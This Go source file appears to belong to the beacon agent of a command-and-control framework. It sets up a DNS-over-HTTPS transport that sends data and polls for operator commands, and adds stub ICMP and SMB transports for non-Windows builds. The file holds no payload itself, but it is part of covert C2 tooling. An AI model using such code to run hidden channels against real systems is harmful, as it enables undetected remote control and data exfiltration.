//go:build !windows

package main

import (
	"fmt"

	"github.com/mjopsec/taburtuaiC2/pkg/transport"
)

// dohAdapter wraps transport.DoHClient (available on all platforms).
type dohAdapter struct{ c *transport.DoHClient }

func (d *dohAdapter) SendData(payload []byte) error { return d.c.SendData(payload) }
func (d *dohAdapter) PollCommand() ([]byte, error)  { return d.c.PollCommand() }

func newDoHTransport(domain, agentID, provider string) BeaconTransport {
	p := transport.DoHProvider(provider)
	if p == "" {
		p = transport.DoHCloudflare
	}
	return &dohAdapter{c: transport.NewDoHClient(domain, agentID, p)}
}

// ICMP and SMB are Windows-only — return errors on other platforms.

func newICMPTransport(_, _ string) (BeaconTransport, error) {
	return nil, fmt.Errorf("ICMP transport is only supported on Windows")
}

func newSMBTransport(_, _, _ string) (BeaconTransport, error) {
	return nil, fmt.Errorf("SMB named pipe transport is only supported on Windows")
}
